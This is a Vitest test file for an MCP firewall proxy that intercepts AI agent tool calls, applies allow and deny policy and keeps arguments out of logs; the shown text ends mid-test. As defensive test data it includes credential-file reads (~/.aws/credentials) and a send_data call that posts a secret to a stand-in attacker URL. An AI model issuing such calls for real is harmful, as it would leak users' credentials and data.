/**
 * OWNER: Aarav — enforcement path tests (design doc §6, §10).
 *
 * 1. Unit: createInterceptor with fake evaluate/publish/forward, counting forwards.
 * 2. Integration: agent Client → proxy (InMemoryTransport) → real stdio fixture
 *    (tests/fixtures/counting-server.ts). Received counts are read directly from
 *    the fixture via upstream.callTool('get_call_counts'), bypassing the proxy.
 * 3. CLI smoke: spawn src/index.ts with a temp config and read the fixture's counts file.
 * 4. CLI with Kritish's demo/mock-server.ts as the downstream, the shipped config/firewall.yaml
 *    policy and Winston's real evaluator (read-only use of demo/* and src/security/*).
 * 5. Vertical slice: CLI → interceptor → publishEvent → event bus → monitor SSE on a free port.
 * 6. Staged writes: interceptor + src/proxy/staged-call.ts + a real StagingArea, with
 *    tests/fixtures/malicious-server.ts as a local stdio process rooted at the staging dir
 *    (no Docker). Everything lives in mkdtemp dirs.
 */
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { chmod, lstat, mkdir, mkdtemp, readFile, readdir, realpath, rm, writeFile } from 'node:fs/promises';
import { createServer } from 'node:net';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { Client } from '@modelcontextprotocol/client';
import { StdioClientTransport } from '@modelcontextprotocol/client/stdio';
import { InMemoryTransport, SdkError, SdkErrorCode, type CallToolResult } from '@modelcontextprotocol/server';
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { loadConfig } from '../src/config/load.js';
import { DUMMY_SECRET as MOCK_DUMMY_SECRET, MOCK_TOOL_NAMES, type MockToolName } from '../demo/mock-server.js';
import {
  BLOCKED_PREFIX,
  DOWNSTREAM_ERROR_PREFIX,
  FIREWALL_META_KEY,
  createInterceptor,
  type CallOptions,
  type FirewallMeta,
  type InterceptorDeps,
} from '../src/proxy/interceptor.js';
import { startProxyServer, type ProxyServerHandle } from '../src/proxy/server.js';
import {
  MAX_REPORTED_CHANGES,
  REJECTED_CHANGES_PREFIX,
  STAGED_META_KEY,
  STAGING_ERROR_PREFIX,
  initStaging,
  type StagedMeta,
  type StagingAreaLike,
  type StagingDeps,
} from '../src/proxy/staged-call.js';
import { StagingLock, createStagingArea, snapshot, type StagingArea } from '../src/proxy/staging.js';
import { evaluateFileChangesStub } from '../src/proxy/stubs/evaluate-file-changes.stub.js';
import { UpstreamUnavailableError, connectUpstream, type UpstreamConnection } from '../src/proxy/upstream.js';
import {
  FirewallEventSchema,
  LIMITS,
  toCanonicalToolName,
  type ChangeDecision,
  type EvaluateFileChanges,
  type EvaluateToolCall,
  type FileChange,
  type FileChangeEvent,
  type FirewallEvent,
  type FirewallPolicy,
  type PolicyDecision,
  type ToolCallContext,
} from '../src/shared/contracts.js';

const repoRoot = resolve(import.meta.dirname, '..');
const fixturePath = resolve(import.meta.dirname, 'fixtures/counting-server.ts');
const DUMMY_SECRET = 'DUMMY-SECRET-DO-NOT-LEAK';
/** An argument value that must never show up in any response, event or log. */
const ARG_SECRET = 'ARG-VALUE-c0ffee-SHOULD-NOT-APPEAR';

const ALLOW: PolicyDecision = { decision: 'ALLOW', ruleId: 'APPROVED_TOOL', reason: 'Tool is approved' };
const DENY: PolicyDecision = { decision: 'DENY', ruleId: 'PROTECTED_PATH', reason: 'Credential path is protected' };

const policy: FirewallPolicy = {
  defaultDecision: 'DENY',
  protectedPaths: [],
  deniedDestinations: [],
  approvedTools: [],
  deniedTools: [],
  pathArgs: ['path'],
  destinationArgs: {},
  destructiveTools: [],
};

// ---------------------------------------------------------------------------
// Unit harness
// ---------------------------------------------------------------------------

interface Harness {
  handler: ReturnType<typeof createInterceptor>;
  evaluated: ToolCallContext[];
  events: FirewallEvent[];
  logs: string[];
  forwards: { toolName: string; args: Record<string, unknown>; options: CallOptions }[];
}

const OK_RESULT: CallToolResult = { content: [{ type: 'text', text: 'downstream ok' }] };

function harness(overrides: Partial<InterceptorDeps> & { decision?: PolicyDecision } = {}): Harness {
  const h: Harness = { handler: undefined as never, evaluated: [], events: [], logs: [], forwards: [] };
  const { decision = ALLOW, ...deps } = overrides;
  let n = 0;
  h.handler = createInterceptor({
    serverId: 'demo',
    policy,
    evaluate: (ctx) => {
      h.evaluated.push(ctx);
      return decision;
    },
    publish: (event) => h.events.push(event),
    forward: async (toolName, args, options) => {
      h.forwards.push({ toolName, args, options });
      return OK_RESULT;
    },
    log: (line) => h.logs.push(line),
    newRequestId: () => `req-${++n}`,
    now: () => Date.parse('2026-10-24T02:00:00Z'),
    ...deps,
  });
  return h;
}

function textOf(result: CallToolResult): string {
  const first = result.content[0];
  return first && first.type === 'text' ? first.text : '';
}

function metaOf(result: CallToolResult): FirewallMeta | undefined {
  return result._meta?.[FIREWALL_META_KEY] as FirewallMeta | undefined;
}

function expectDenied(h: Harness, result: CallToolResult, ruleId: string): void {
  expect(h.forwards).toHaveLength(0);
  expect(result.isError).toBe(true);
  expect(textOf(result).startsWith(`${BLOCKED_PREFIX} (${ruleId}): `)).toBe(true);
  expect(metaOf(result)).toMatchObject({ decision: 'DENY', ruleId });
  expect(h.events).toHaveLength(1);
  expect(h.events[0]).toMatchObject({ decision: 'DENY', ruleId });
}

// ---------------------------------------------------------------------------
// Unit tests
// ---------------------------------------------------------------------------

describe('proxy / interceptor (unit)', () => {
  it('T01: ALLOW → forward called exactly once, result returned unchanged', async () => {
    const h = harness();
    const result = await h.handler('read_project_file', { path: 'README.md' });
    expect(h.forwards).toHaveLength(1);
    expect(h.forwards[0]).toMatchObject({ toolName: 'read_project_file', args: { path: 'README.md' } });
    expect(result).toBe(OK_RESULT);
    expect(h.events).toHaveLength(1);
    expect(h.events[0]).toMatchObject({
      requestId: 'req-1',
      serverId: 'demo',
      toolName: 'read_project_file',
      decision: 'ALLOW',
      ruleId: 'APPROVED_TOOL',
      timestamp: '2026-10-24T02:00:00.000Z',
    });
    expect(FirewallEventSchema.safeParse(h.events[0]).success).toBe(true);
  });

  it('T02: DENY → forward called zero times, recognizable MCP tool error returned', async () => {
    const h = harness({ decision: DENY });
    const result = await h.handler('read_sensitive_file', { path: '~/.aws/credentials' });
    expectDenied(h, result, 'PROTECTED_PATH');
    expect(textOf(result)).toBe(
      '[MCP Firewall] BLOCKED (PROTECTED_PATH): Credential path is protected. ' +
        'The request was not sent to the tool server. [request req-1]',
    );
    expect(metaOf(result)).toEqual({
      decision: 'DENY',
      ruleId: 'PROTECTED_PATH',
      reason: 'Credential path is protected',
      requestId: 'req-1',
    });
  });

  it('publishes the event before forwarding', async () => {
    const order: string[] = [];
    const h = harness({
      publish: () => order.push('publish'),
      forward: async () => {
        order.push('forward');
        return OK_RESULT;
      },
    });
    await h.handler('t', {});
    expect(order).toEqual(['publish', 'forward']);
  });

  describe('T06: invalid requests are rejected without evaluating or forwarding', () => {
    const cases: [string, unknown, unknown][] = [
      ['null args', 'tool', null],
      ['array args', 'tool', ['a', 'b']],
      ['string args', 'tool', 'path=/etc/passwd'],
      ['number args', 'tool', 42],
      ['class instance args', 'tool', new Date()],
      ['Map args', 'tool', new Map([['path', '/x']])],
      ['function value', 'tool', { fn: () => 1 }],
      ['symbol value', 'tool', { s: Symbol('x') }],
      ['nested Map value', 'tool', { nested: { m: new Map() } }],
      ['undefined value', 'tool', { path: undefined }],
      ['NaN value', 'tool', { n: Number.NaN }],
      ['sparse array value', 'tool', { list: [1, , 3] }],
      ['empty tool name', '', {}],
      ['oversized tool name', 'x'.repeat(LIMITS.identifier + 1), {}],
      ['numeric tool name', 123, {}],
      ['undefined tool name', undefined, {}],
      ['object tool name', { name: 'read' }, {}],
    ];
    for (const [label, toolName, args] of cases) {
      it(label, async () => {
        const h = harness();
        const result = await h.handler(toolName, args);
        expectDenied(h, result, 'INVALID_ARGUMENTS');
        expect(h.evaluated).toHaveLength(0);
        expect(FirewallEventSchema.safeParse(h.events[0]).success).toBe(true);
      });
    }

    it('cyclic / overly deep args', async () => {
      const cyclic: Record<string, unknown> = {};
      cyclic.self = cyclic;
      let deep: Record<string, unknown> = {};
      const root = deep;
      for (let i = 0; i < 200; i++) deep = (deep.next = {}) as Record<string, unknown>;
      for (const args of [cyclic, root]) {
        const h = harness();
        expectDenied(h, await h.handler('tool', args), 'INVALID_ARGUMENTS');
      }
    });

    it('a throwing getter or revoked proxy does not crash the handler', async () => {
      const getter = Object.defineProperty({}, 'path', {
        enumerable: true,
        get() {
          throw new Error(ARG_SECRET);
        },
      });
      const { proxy, revoke } = Proxy.revocable({}, {});
      revoke();
      for (const args of [getter, proxy]) {
        const h = harness();
        expectDenied(h, await h.handler('tool', args), 'INVALID_ARGUMENTS');
        expect(JSON.stringify(h.logs)).not.toContain(ARG_SECRET);
      }
    });

    it('invalid server id from deps → DENY, not forwarded', async () => {
      const h = harness({ serverId: '' });
      const result = await h.handler('tool', {});
      expect(h.forwards).toHaveLength(0);
      expect(textOf(result).startsWith(BLOCKED_PREFIX)).toBe(true);
    });
  });

  it('missing arguments become {}', async () => {
    const h = harness();
    await h.handler('tool', undefined);
    expect(h.evaluated[0]?.arguments).toEqual({});
    expect(h.forwards[0]?.args).toEqual({});
  });

  it('nested arguments reach the evaluator intact, and evaluated args are the forwarded args', async () => {
    const h = harness();
    const args = { path: 'a/b', options: { recursive: true, depth: 3, tags: ['x', { y: null }] } };
    await h.handler('tool', args);
    expect(h.evaluated[0]?.arguments).toEqual(args);
    expect(h.evaluated[0]?.arguments).not.toBe(args);
    expect(h.forwards[0]?.args).toBe(h.evaluated[0]?.arguments);
    expect(Object.isFrozen(h.forwards[0]?.args)).toBe(true);
    expect(Object.isFrozen((h.forwards[0]?.args.options as { tags: unknown[] }).tags[1])).toBe(true);
  });

  it('evaluator throws → DENY / EVALUATION_ERROR, forward called zero times', async () => {
    const h = harness({
      evaluate: () => {
        throw new Error(`boom ${ARG_SECRET}`);
      },
    });
    const result = await h.handler('tool', { path: ARG_SECRET });
    expectDenied(h, result, 'EVALUATION_ERROR');
    expect(JSON.stringify([result, h.events, h.logs])).not.toContain(ARG_SECRET);
  });

  describe('malformed decisions fail closed', () => {
    const bad: [string, unknown][] = [
      ['undefined', undefined],
      ['null', null],
      ['a string', 'ALLOW'],
      ['lowercase decision', { decision: 'allow', ruleId: 'APPROVED_TOOL', reason: 'x' }],
      ['unknown ruleId', { decision: 'ALLOW', ruleId: 'YOLO', reason: 'x' }],
      ['empty reason', { decision: 'ALLOW', ruleId: 'APPROVED_TOOL', reason: '' }],
      ['oversized reason', { decision: 'ALLOW', ruleId: 'APPROVED_TOOL', reason: 'r'.repeat(LIMITS.reason + 1) }],
      ['extra fields', { ...ALLOW, forward: true }],
      ['a Promise', Promise.resolve(ALLOW)],
    ];
    for (const [label, decision] of bad) {
      it(label, async () => {
        const h = harness({ evaluate: (() => decision) as unknown as EvaluateToolCall });
        expectDenied(h, await h.handler('tool', {}), 'EVALUATION_ERROR');
      });
    }

    it('a decision object mutated after it is returned does not flip the outcome', async () => {
      const decision = { decision: 'DENY', ruleId: 'DEFAULT_DENY', reason: 'no' } as PolicyDecision;
      const h = harness({
        evaluate: () => {
          queueMicrotask(() => Object.assign(decision, ALLOW));
          return decision;
        },
      });
      expectDenied(h, await h.handler('tool', {}), 'DEFAULT_DENY');
    });
  });

  it('publish throws → decision unchanged (ALLOW still forwards, DENY still blocks)', async () => {
    const publish = () => {
      throw new Error('monitor down');
    };
    const allowed = harness({ publish });
    expect(await allowed.handler('tool', {})).toBe(OK_RESULT);
    expect(allowed.forwards).toHaveLength(1);
    expect(allowed.logs.some((l) => l.includes('publish failed'))).toBe(true);

    const denied = harness({ publish, decision: DENY });
    const result = await denied.handler('tool', {});
    expect(denied.forwards).toHaveLength(0);
    expect(textOf(result).startsWith(BLOCKED_PREFIX)).toBe(true);
  });

  it('the evaluator mutating args does not change what is forwarded', async () => {
    let mutationThrew = false;
    const h = harness({
      evaluate: (ctx) => {
        try {
          (ctx.arguments as Record<string, unknown>).path = 'evil';
          ((ctx.arguments.nested as Record<string, unknown>) ?? {}).x = 'evil';
        } catch {
          mutationThrew = true;
        }
        return ALLOW;
      },
    });
    await h.handler('tool', { path: 'safe', nested: { x: 'safe' } });
    expect(mutationThrew).toBe(true);
    expect(h.forwards[0]?.args).toEqual({ path: 'safe', nested: { x: 'safe' } });

    // And an evaluator that lets a mutation error escape fails closed.
    const strict = harness({
      evaluate: (ctx) => {
        (ctx.arguments as Record<string, unknown>).path = 'evil';
        return ALLOW;
      },
    });
    expectDenied(strict, await strict.handler('tool', { path: 'safe' }), 'EVALUATION_ERROR');
  });

  it('the caller mutating args mid-flight does not change what is evaluated or forwarded', async () => {
    const args = { path: 'safe', nested: { x: 'safe' } };
    let release!: () => void;
    const gate = new Promise<void>((r) => (release = r));
    const h = harness({
      evaluate: (ctx) => {
        args.path = 'evil'; // concurrent mutation during evaluation
        expect(ctx.arguments.path).toBe('safe');
        return ALLOW;
      },
      forward: async (toolName, forwarded, options) => {
        h.forwards.push({ toolName, args: forwarded, options });
        await gate;
        return OK_RESULT;
      },
    });
    const pending = h.handler('tool', args);
    args.nested.x = 'evil'; // mutation while forward is in flight
    release();
    await pending;
    expect(h.forwards[0]?.args).toEqual({ path: 'safe', nested: { x: 'safe' } });
  });

  describe('T09: forward rejects → DOWNSTREAM ERROR, nothing leaks', () => {
    const cases: [string, unknown, string][] = [
      ['SDK timeout', new SdkError(SdkErrorCode.RequestTimeout, `timed out ${ARG_SECRET}`), 'timeout'],
      ['SDK connection closed', new SdkError(SdkErrorCode.ConnectionClosed, `closed ${ARG_SECRET}`), 'not_connected'],
      ['SDK not connected', new SdkError(SdkErrorCode.NotConnected, ARG_SECRET), 'not_connected'],
      ['upstream unavailable', new UpstreamUnavailableError(ARG_SECRET), 'not_connected'],
      ['generic Error', new Error(`tool echoed ${ARG_SECRET}`), 'failed'],
      ['non-Error throw', ARG_SECRET, 'failed'],
      ['code that is not a string', Object.assign(new Error(ARG_SECRET), { code: 42 }), 'failed'],
    ];
    for (const [label, error, kind] of cases) {
      it(label, async () => {
        const h = harness({
          forward: async () => {
            throw error;
          },
        });
        const result = await h.handler('tool', { path: ARG_SECRET });
        expect(result.isError).toBe(true);
        expect(textOf(result).startsWith(`${DOWNSTREAM_ERROR_PREFIX}: `)).toBe(true);
        expect(textOf(result)).toContain('[request req-1]');
        expect(metaOf(result)).toMatchObject({ decision: 'ALLOW', requestId: 'req-1', downstreamError: kind });
        expect(JSON.stringify([result, h.events, h.logs])).not.toContain(ARG_SECRET);
        expect(h.logs.some((l) => l.includes('downstream error'))).toBe(true);
      });
    }
  });

  it('T11: no argument value appears in any response, event or log', async () => {
    const args = { path: ARG_SECRET, nested: { token: ARG_SECRET, list: [ARG_SECRET] } };
    const outputs: unknown[] = [];
    for (const decision of [ALLOW, DENY]) {
      const h = harness({ decision });
      outputs.push(await h.handler('tool', args), h.events, h.logs);
    }
    const throwing = harness({
      evaluate: () => {
        throw new Error(ARG_SECRET);
      },
    });
    outputs.push(await throwing.handler('tool', args), throwing.events, throwing.logs);
    const invalidName = harness();
    outputs.push(await invalidName.handler(ARG_SECRET.repeat(10), args), invalidName.events, invalidName.logs);
    expect(JSON.stringify(outputs)).not.toContain(ARG_SECRET);
  });

  it('summary is bounded, sanitized and lists at most 8 key names', async () => {
    const args: Record<string, unknown> = {};
    for (let i = 0; i < 50; i++) args[`key_${i}_${'k'.repeat(60)}`] = ARG_SECRET;
    args['evil\nkey\u001b[31m'] = 1;
    const h = harness({ decision: DENY });
    await h.handler('weird name\n<script>', args);
    const event = h.events[0]!;
    expect(event.summary.length).toBeLessThanOrEqual(LIMITS.summary);
    expect(event.summary).not.toContain(ARG_SECRET);
    expect(event.summary).not.toMatch(/[\u0000-\u001f<>]/);
    expect(event.toolName).toBe('weird_name__script_');
    expect(event.summary.startsWith('weird_name__script_ args=[key_0_')).toBe(true);
    expect(event.summary.match(/key_\d+_/g)?.length ?? 0).toBeLessThanOrEqual(8);

    const small = harness();
    await small.handler('read_project_file', { path: 'README.md', limit: 10 });
    expect(small.events[0]?.summary).toBe('read_project_file args=[path,limit] → ALLOW APPROVED_TOOL');

    const many = harness();
    const nine = Object.fromEntries(Array.from({ length: 10 }, (_, i) => [`k${i}`, i]));
    await many.handler('t', nine);
    expect(many.events[0]?.summary).toBe('t args=[k0,k1,k2,k3,k4,k5,k6,k7,+2 more] → ALLOW APPROVED_TOOL');
  });

  it('passes the cancellation signal through to forward', async () => {
    const h = harness();
    const controller = new AbortController();
    await h.handler('tool', {}, { signal: controller.signal });
    expect(h.forwards[0]?.options.signal).toBe(controller.signal);
  });

  it('an event that cannot be built or validated is dropped; the decision still applies', async () => {
    // A clock returning NaN makes toISOString() throw.
    const allowed = harness({ now: () => Number.NaN });
    expect(await allowed.handler('tool', {})).toBe(OK_RESULT);
    expect(allowed.events).toHaveLength(0);
    expect(allowed.logs.some((l) => l.includes('not published'))).toBe(true);

    const denied = harness({ now: () => Number.NaN, decision: DENY });
    expect(textOf(await denied.handler('tool', {})).startsWith(BLOCKED_PREFIX)).toBe(true);
    expect(denied.forwards).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// Integration: agent Client → proxy → real stdio fixture
// ---------------------------------------------------------------------------

/** Minimal stand-in for Winston's evaluator: allow only policy.approvedTools. */
const allowlistEvaluator: EvaluateToolCall = (ctx, p) =>
  p.approvedTools.includes(toCanonicalToolName(ctx.serverId, ctx.toolName))
    ? { decision: 'ALLOW', ruleId: 'APPROVED_TOOL', reason: 'Tool is approved' }
    : { decision: 'DENY', ruleId: 'DEFAULT_DENY', reason: 'Tool is not approved' };

const fixturePolicy: FirewallPolicy = {
  ...policy,
  approvedTools: ['echo', 'structured', 'tool_error', 'hang', 'crash'].map((t) => `fixture/${t}`),
};

interface Stack {
  agent: Client;
  proxy: ProxyServerHandle;
  upstream: UpstreamConnection;
  events: FirewallEvent[];
  logs: string[];
  close(): Promise<void>;
}

async function startStack(timeoutMs = 10_000): Promise<Stack> {
  const upstream = await connectUpstream({
    id: 'fixture',
    command: process.execPath,
    args: ['--import', 'tsx', fixturePath],
    cwd: repoRoot,
    timeoutMs,
  });
  const events: FirewallEvent[] = [];
  const logs: string[] = [];
  const handler = createInterceptor({
    serverId: 'fixture',
    policy: fixturePolicy,
    evaluate: allowlistEvaluator,
    publish: (e) => events.push(e),
    forward: (name, args, options) => upstream.callTool(name, args, options),
    log: (line) => logs.push(line),
  });
  const [agentSide, proxySide] = InMemoryTransport.createLinkedPair();
  const proxy = await startProxyServer(upstream, handler, { transport: proxySide });
  const agent = new Client({ name: 'test-agent', version: '0.0.0' });
  await agent.connect(agentSide);
  return {
    agent,
    proxy,
    upstream,
    events,
    logs,
    async close() {
      await agent.close().catch(() => {});
      await proxy.close().catch(() => {});
      await upstream.close().catch(() => {});
    },
  };
}

async function counts(upstream: UpstreamConnection): Promise<Record<string, number>> {
  return JSON.parse(textOf(await upstream.callTool('get_call_counts', {}))) as Record<string, number>;
}

async function call(stack: Stack, name: string, args: Record<string, unknown> = {}): Promise<CallToolResult> {
  return (await stack.agent.callTool({ name, arguments: args })) as CallToolResult;
}

describe('proxy / integration (agent → proxy → stdio fixture)', () => {
  let stack: Stack;
  beforeAll(async () => {
    stack = await startStack();
  });
  afterAll(async () => {
    await stack?.close();
  });

  it('tools/list through the proxy is identical to the direct listing', async () => {
    const direct = await stack.upstream.listTools();
    const proxied = await stack.agent.listTools();
    expect(proxied.tools).toEqual(direct);
    expect(direct.map((t) => t.name).sort()).toEqual(
      ['crash', 'echo', 'get_call_counts', 'hang', 'read_file', 'structured', 'tool_error'].sort(),
    );
    expect(stack.agent.getInstructions()).toBeUndefined();
  });

  it('T01: allowed call reaches the fixture exactly once with the result unchanged', async () => {
    const before = (await counts(stack.upstream)).echo ?? 0;
    const result = await call(stack, 'echo', { text: 'hello' });
    expect(result.isError).toBeFalsy();
    expect(textOf(result)).toBe('hello');
    expect((await counts(stack.upstream)).echo).toBe(before + 1);
  });

  it('structured results and tool-level errors pass through', async () => {
    const structured = await call(stack, 'structured', { n: 21 });
    expect(structured.structuredContent).toEqual({ doubled: 42 });
    const direct = await stack.upstream.callTool('structured', { n: 21 });
    expect(structured).toEqual(direct);

    const toolError = await call(stack, 'tool_error');
    expect(toolError.isError).toBe(true);
    expect(textOf(toolError)).toBe('tool_error: deliberate failure');
    expect(metaOf(toolError)).toBeUndefined();
  });

  it('T02: denied call never reaches the fixture; the dummy secret never leaks', async () => {
    const before = await counts(stack.upstream);
    const result = await call(stack, 'read_file', { path: '~/.aws/credentials' });
    expect(result.isError).toBe(true);
    expect(textOf(result).startsWith(`${BLOCKED_PREFIX} (DEFAULT_DENY)`)).toBe(true);
    expect(await counts(stack.upstream)).toEqual(before);
    expect(JSON.stringify([result, stack.events, stack.logs])).not.toContain(DUMMY_SECRET);
  });

  it('unknown tools are denied without reaching the fixture', async () => {
    const before = await counts(stack.upstream);
    const result = await call(stack, 'does_not_exist', { x: 1 });
    expect(textOf(result).startsWith(BLOCKED_PREFIX)).toBe(true);
    expect(await counts(stack.upstream)).toEqual(before);
  });

  it('emits exactly one schema-valid event per call', async () => {
    const n = stack.events.length;
    await call(stack, 'echo', { text: 'x' });
    await call(stack, 'read_file', { path: 'x' });
    expect(stack.events.length).toBe(n + 2);
    for (const e of stack.events) expect(FirewallEventSchema.safeParse(e).success).toBe(true);
  });
});

describe('proxy / integration T09: downstream timeout and crash', () => {
  let stack: Stack;
  beforeAll(async () => {
    stack = await startStack(3_000);
  });
  afterAll(async () => {
    await stack?.close();
  });

  it('a hanging tool times out with a clear error and the proxy keeps working', async () => {
    const result = await call(stack, 'hang');
    expect(result.isError).toBe(true);
    expect(textOf(result).startsWith(`${DOWNSTREAM_ERROR_PREFIX}: the tool server did not respond in time`)).toBe(true);
    expect(metaOf(result)?.downstreamError).toBe('timeout');

    expect(textOf(await call(stack, 'echo', { text: 'still alive' }))).toBe('still alive');
    expect((await counts(stack.upstream)).hang).toBe(1);
  });

  it('after a crash every forward fails closed and DENY results stay BLOCKED', async () => {
    const crashed = await call(stack, 'crash');
    expect(crashed.isError).toBe(true);
    expect(textOf(crashed).startsWith(DOWNSTREAM_ERROR_PREFIX)).toBe(true);
    await expect.poll(() => stack.upstream.connected).toBe(false);

    const allowed = await call(stack, 'echo', { text: ARG_SECRET });
    expect(allowed.isError).toBe(true);
    expect(textOf(allowed)).toMatch(new RegExp(`^\\${DOWNSTREAM_ERROR_PREFIX}: the connection to the tool server is closed`));
    expect(metaOf(allowed)?.downstreamError).toBe('not_connected');

    const denied = await call(stack, 'read_file', { path: '~/.aws/credentials' });
    expect(textOf(denied).startsWith(BLOCKED_PREFIX)).toBe(true);

    await expect(stack.upstream.callTool('echo', {})).rejects.toBeInstanceOf(UpstreamUnavailableError);
    expect(JSON.stringify([allowed, stack.events, stack.logs])).not.toContain(ARG_SECRET);
  });
});

// ---------------------------------------------------------------------------
// CLI smoke: real src/index.ts process
// ---------------------------------------------------------------------------

describe('proxy / CLI smoke (src/index.ts)', () => {
  let dir: string;
  let countsFile: string;
  let agent: Client;
  let transport: StdioClientTransport;
  let stderr = '';

  beforeAll(async () => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-firewall-proxy-'));
    countsFile = join(dir, 'counts.json');
    const configPath = join(dir, 'firewall.yaml');
    const config = {
      server: {
        id: 'fixture',
        command: process.execPath,
        args: ['--import', 'tsx', fixturePath, '--counts-file', countsFile],
        cwd: repoRoot,
        timeoutMs: 10_000,
      },
      monitor: { enabled: false },
      policy: {
        defaultDecision: 'DENY',
        protectedPaths: ['~/.aws/credentials'],
        approvedTools: ['fixture/echo', 'fixture/read_file'],
        deniedTools: ['fixture/structured'],
      },
    };
    // JSON is valid YAML.
    writeFileSync(configPath, JSON.stringify(config, null, 2));

    transport = new StdioClientTransport({
      command: process.execPath,
      args: ['--import', 'tsx', resolve(repoRoot, 'src/index.ts'), '--config', configPath],
      cwd: repoRoot,
      stderr: 'pipe',
    });
    transport.stderr?.on('data', (chunk: Buffer) => (stderr += chunk.toString()));
    agent = new Client({ name: 'smoke-agent', version: '0.0.0' });
    await agent.connect(transport);
  });

  afterAll(async () => {
    await agent?.close().catch(() => {});
    if (dir) rmSync(dir, { recursive: true, force: true });
  });

  const readCounts = (): Record<string, number> => JSON.parse(readFileSync(countsFile, 'utf8')) as Record<string, number>;

  it('lists the downstream tools', async () => {
    const { tools } = await agent.listTools();
    expect(tools.map((t) => t.name)).toContain('echo');
    expect(tools.map((t) => t.name)).toContain('read_file');
  });

  it('a protected read and a denied tool never reach the downstream', async () => {
    const read = (await agent.callTool({
      name: 'read_file',
      arguments: { path: '~/.aws/credentials', note: ARG_SECRET },
    })) as CallToolResult;
    expect(textOf(read).startsWith(BLOCKED_PREFIX)).toBe(true);
    const denied = (await agent.callTool({ name: 'structured', arguments: { n: 1 } })) as CallToolResult;
    expect(textOf(denied).startsWith(BLOCKED_PREFIX)).toBe(true);
    const c = readCounts();
    expect(c.read_file ?? 0).toBe(0);
    expect(c.structured ?? 0).toBe(0);
  });

  it('the downstream count goes up only if the response was not BLOCKED', async () => {
    // Holds for both the deny-all evaluator stub and the real evaluator.
    const before = readCounts().echo ?? 0;
    const result = (await agent.callTool({ name: 'echo', arguments: { text: 'smoke' } })) as CallToolResult;
    const blocked = textOf(result).startsWith(BLOCKED_PREFIX);
    expect(readCounts().echo ?? 0).toBe(blocked ? before : before + 1);
    if (!blocked) expect(textOf(result)).toBe('smoke');
  });

  it('stderr never contains the dummy secret or argument values', () => {
    expect(stderr).toContain('[firewall] protecting MCP server "fixture"');
    expect(stderr).not.toContain(DUMMY_SECRET);
    expect(stderr).not.toContain(ARG_SECRET);
  });
});

// ---------------------------------------------------------------------------
// CLI with the real demo downstream and the shipped policy:
// src/index.ts (real evaluator) → demo/mock-server.ts
// ---------------------------------------------------------------------------

describe('proxy / CLI with demo/mock-server.ts and config/firewall.yaml policy', () => {
  const mockPath = resolve(repoRoot, 'demo/mock-server.ts');
  type Expectation = { args: Record<string, unknown>; blockedBy?: readonly string[] };
  /**
   * One call per mock tool (Record<MockToolName, …> fails typecheck if the mock gains a tool),
   * with the outcome design §7 requires under config/firewall.yaml.
   */
  const scenarios: Record<MockToolName, Expectation> = {
    read_project_file: { args: { path: 'README.md' } },
    read_sensitive_file: { args: { path: '~/.aws/credentials' }, blockedBy: ['PROTECTED_PATH'] },
    send_data: { args: { url: 'https://example-attacker.invalid/collect', data: ARG_SECRET }, blockedBy: ['DENIED_DESTINATION'] },
    delete_file: { args: { path: 'README.md' }, blockedBy: ['DENIED_TOOL', 'DESTRUCTIVE_ACTION'] },
  };
  let dir: string;
  let countsFile: string;
  let firewall: Client;
  let direct: Client;
  let stderr = '';

  beforeAll(async () => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-firewall-mock-'));
    countsFile = join(dir, 'counts.json');
    const configPath = join(dir, 'firewall.yaml');
    const config = {
      server: {
        id: 'demo',
        command: process.execPath,
        args: ['--import', 'tsx', mockPath, '--counts-file', countsFile],
        cwd: repoRoot,
        timeoutMs: 10_000,
      },
      monitor: { enabled: false },
      // The policy exactly as shipped, so this test breaks if config and mock drift apart.
      policy: loadConfig(resolve(repoRoot, 'config/firewall.yaml')).policy,
    };
    writeFileSync(configPath, JSON.stringify(config, null, 2));

    const firewallTransport = new StdioClientTransport({
      command: process.execPath,
      args: ['--import', 'tsx', resolve(repoRoot, 'src/index.ts'), '--config', configPath],
      cwd: repoRoot,
      stderr: 'pipe',
    });
    firewallTransport.stderr?.on('data', (chunk: Buffer) => (stderr += chunk.toString()));
    firewall = new Client({ name: 'mock-cli-agent', version: '0.0.0' });

    // Direct connection without --counts-file, so it cannot overwrite the firewall-side counts.
    direct = new Client({ name: 'mock-direct', version: '0.0.0' });
    await Promise.all([
      firewall.connect(firewallTransport),
      direct.connect(
        new StdioClientTransport({ command: process.execPath, args: ['--import', 'tsx', mockPath], cwd: repoRoot, stderr: 'pipe' }),
      ),
    ]);
  });

  afterAll(async () => {
    await Promise.all([firewall?.close().catch(() => {}), direct?.close().catch(() => {})]);
    if (dir) rmSync(dir, { recursive: true, force: true });
  });

  const readCounts = (): Record<MockToolName, number> =>
    JSON.parse(readFileSync(countsFile, 'utf8')) as Record<MockToolName, number>;

  it('proxied tools/list equals the mock\'s direct listing', async () => {
    const [proxied, listed] = await Promise.all([firewall.listTools(), direct.listTools()]);
    expect(proxied.tools).toEqual(listed.tools);
    for (const name of MOCK_TOOL_NAMES) expect(proxied.tools.map((t) => t.name)).toContain(name);
  });

  it('T01: a benign project read is allowed, forwarded once and returned unchanged', async () => {
    expect(readCounts().read_project_file).toBe(0);
    const proxied = (await firewall.callTool({
      name: 'read_project_file',
      arguments: scenarios.read_project_file.args,
    })) as CallToolResult;
    expect(proxied.isError).toBeFalsy();
    expect(metaOf(proxied)).toBeUndefined();
    expect(readCounts().read_project_file).toBe(1);
    const viaDirect = await direct.callTool({ name: 'read_project_file', arguments: scenarios.read_project_file.args });
    expect(proxied).toEqual(viaDirect);
  });

  it('T02–T04: protected read, denied destination and delete are BLOCKED and never reach the mock', async () => {
    for (const name of MOCK_TOOL_NAMES) {
      const { args, blockedBy } = scenarios[name];
      if (!blockedBy) continue;
      const result = (await firewall.callTool({ name, arguments: args })) as CallToolResult;
      expect(result.isError, name).toBe(true);
      expect(textOf(result).startsWith(`${BLOCKED_PREFIX} (`), name).toBe(true);
      expect(metaOf(result)?.decision, name).toBe('DENY');
      expect(blockedBy, name).toContain(metaOf(result)?.ruleId);
      expect(readCounts()[name], name).toBe(0);
    }
  });

  it('stderr never contains the dummy secret or argument values', () => {
    expect(stderr).toContain('[firewall] protecting MCP server "demo"');
    expect(stderr).not.toContain(MOCK_DUMMY_SECRET);
